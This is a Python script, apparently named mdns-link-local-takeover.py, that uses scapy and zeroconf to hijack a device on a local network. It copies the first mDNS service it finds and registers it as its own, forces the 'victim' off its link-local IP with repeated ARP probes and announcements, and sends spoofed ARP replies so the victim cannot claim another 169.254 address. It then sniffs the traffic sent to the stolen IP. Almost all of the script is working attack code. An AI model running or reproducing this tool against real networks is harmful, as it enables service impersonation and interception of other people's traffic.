import scapy.all as scapy
import sys
import time
import re 
from zeroconf import ServiceBrowser, Zeroconf, IPVersion, ServiceInfo
import socket


class MalListener:
    def __init__(self):
        self.infos = []
        self.ip = "127.0.0.1"
        self.names = []
        self.got_one = False
    def remove_service(self, zeroconf, type, name):
        print("Service %s removed" % (name,))
    def add_service(self, zeroconf, type, name): #Pick the first service and copy it, and grab the IP. The basis for this section is mostly copied from Rob Guderian's example
        info = zeroconf.get_service_info(type, name)
        if not self.got_one:
            print("Copying: %s" % (info,))
            zc.register_service(info)
            self.got_one = True
            print(socket.inet_ntoa(info.addresses[0]))
            self.ip = socket.inet_ntoa(info.addresses[0])
        
    def update_service(self, zeroconf, type, name):
        info = zeroconf.get_service_info(type, name)
        


def send_broadcast_request(ip): #Send broadcast ARP request for IP
    pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(op = who, pdst = ip, hwdst = "00:00:00:00:00:00", psrc = "0.0.0.0")
    print("Sending broadcast request")
    scapy.sendp(pkt, verbose = False,  iface=iface_global)
def send_broadcast_announce(ip): #Announce IP in an ARP broadcast
    pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(op = who, pdst = ip, hwdst = "00:00:00:00:00:00", psrc = ip)
    print("Sending broadcast announce")
    scapy.sendp(pkt, verbose = False,  iface=iface_global)
def send_reply(ip,  mac): #Reply to an arp request from mac for ip
    pkt = scapy.Ether(dst=mac)/scapy.ARP(op = reply, pdst = ip, hwdst = mac, psrc = ip_global)
    scapy.sendp(pkt, verbose = False,  iface=iface_global)
def send_spoof_reply(ip,  req_mac, req_ip): #Print receieved non-arp packets
    pkt = scapy.Ether(dst=req_mac)/scapy.ARP(op = is_at, pdst = req_ip, hwdst = req_mac, psrc = ip)
    scapy.sendp(pkt, verbose = False,  iface=iface_global)
def handle_new_packet(pkt): #Print receieved non-arp packets
    print("received new packet:")
    print(scapy.ls(pkt))
    return
def handle_arp_packet(pkt):
    if pkt[scapy.ARP].op == reply and pkt[scapy.ARP].psrc == ip_global and pkt[scapy.Ether].src != mac_global and pkt[scapy.Ether].src != "00:00:00:00:00:00": #If this is the victim, grab their MAC
        global vicmac 
        vicmac = pkt[scapy.Ether].src
        print("Got victim mac: ", vicmac)
    elif pkt[scapy.ARP].op == who and pkt[scapy.ARP].pdst == ip_global and pkt[scapy.Ether].src != mac_global: #If this is an ARP request for us, reply
        print("Got ARP request. Sending reply.")
        send_reply(pkt[scapy.ARP].psrc, pkt[scapy.Ether].src)
    elif pkt[scapy.ARP].op == who: #If this is an arp request from the victim, tell them that we already have that IP
        ll_match = ll_re.match(str(pkt[scapy.ARP].pdst ))
        if ll_match and pkt[scapy.Ether].src == vicmac:
            print('Got ARP request for ',  pkt[scapy.ARP].pdst, "from ", pkt[scapy.Ether].src,  "/",  pkt[scapy.ARP].psrc, " replying saying that's us")
            send_spoof_reply(pkt[scapy.ARP].pdst,  pkt[scapy.Ether].src, pkt[scapy.ARP].psrc)
    
    return

ll_re = re.compile(r"^169\.254\.") #Match link-local addresses
who=1
reply=2
is_at = 2
iface_global = ""
ip_global = ""
mac_global = ""
vicmac = ""
if len(sys.argv) == 3:
    zc = Zeroconf(ip_version=IPVersion.V4Only)
    ml = MalListener()
    zone = sys.argv[1]
    browser = ServiceBrowser(zc, zone, ml)

    while ml.ip == "127.0.0.1": #Wait til we get an IP for our victim
        time.sleep(1)
    iface_global = sys.argv[2]
    ip = ml.ip
    ip_global = ml.ip
    mac_global = scapy.get_if_hwaddr(iface_global)
    s_arp = scapy.AsyncSniffer(filter="arp",  iface=iface_global,  prn=handle_arp_packet) #Setup ARP handler
    s_arp.start() 
    send_broadcast_request(ip) #Force victim off of IP and use it ourselves
    time.sleep(1)
    send_broadcast_request(ip)
    time.sleep(1)
    send_broadcast_request(ip)
    time.sleep(1)
    send_broadcast_announce(ip)
    send_broadcast_announce(ip)
    send_broadcast_announce(ip)
    time.sleep(4)
    s = scapy.AsyncSniffer(filter="!arp && dst host %s" % ip, iface=iface_global,  prn=handle_new_packet) #Requires scapy >= 2..4.3 :( - Start general listener
    s.start()
    false = True #Just to bug you...
    while(false):
        try:
            time.sleep(5)
            send_broadcast_announce(ip) #Keep announcing IP in arp. Probably unneccessary 
        except KeyboardInterrupt:
            s.stop()
            s_arp.stop()
            sys.exit(0)
            zc.unregister_all_services()
            zc.close()
else:
    print("Usage: python3 ./mdns-link-local-takeover.py <zone> <interface>")



    
